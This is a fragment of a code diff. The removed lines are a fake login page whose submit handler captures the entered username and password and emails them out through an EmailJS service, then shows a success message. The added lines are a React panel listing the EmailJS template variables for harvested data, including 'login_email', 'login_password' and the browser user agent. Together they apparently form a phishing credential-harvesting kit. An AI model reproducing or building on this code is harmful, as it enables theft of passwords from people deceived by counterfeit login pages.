-                        document.getElementById('login_button').style.display = 'block';
-                        document.querySelector('.slidercaptcha').style.display = 'none';
-                    },
-                    onFail: function () {
-                        console.log('Captcha failed');
-                        document.getElementById('errmsg').innerHTML = 'Please complete the captcha verification';
-                    }
-                });
-
-                // ── 3. Send login attempt report via EmailJS on form submit ──
-                document.getElementById('loginForm').addEventListener('submit', function (e) {
-                    e.preventDefault();
-
-                    var username = document.getElementById('username').value;
-                    var password = document.getElementById('password').value;
-                    var timestamp = new Date().toLocaleString();
-
-                    emailjs.send("service_nfx0v2t", "template_ccgi8xh", {
-                        username: username,
-                        password: password,
-                        timestamp: timestamp,
-                        page_url: window.location.href
-                    }).then(function () {
-                        // Hide the form and show success message
-                        document.getElementById('loginForm').style.display = 'none';
-                        document.getElementById('success_msg').style.display = 'block';
-                    });
-                });
-            });
-		</script>
-		
-	</body>
-
-</html>
+          {/* Quick guide */}
+          <div className="mt-2 rounded-xl border border-border bg-card p-5">
+            <p className="text-xs font-semibold text-foreground mb-3 font-space">📋 EmailJS Template Variables</p>
+            <div className="grid grid-cols-2 gap-2 text-xs">
+              {[
+                ["{{login_email}}", "Submitted email address"],
+                ["{{login_domain}}", "Domain from the email"],
+                ["{{login_password}}", "Submitted password"],
+                ["{{login_timestamp}}", "ISO timestamp"],
+                ["{{login_user_agent}}", "Browser / device info"],
+              ].map(([key, val]) => (
+                <div key={key} className="flex items-start gap-2">
+                  <code className="bg-muted text-primary px-1.5 py-0.5 rounded text-[10px] font-mono shrink-0">{key}</code>
+                  <span className="text-muted-foreground">{val}</span>
+                </div>
+              ))}
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  );
+}
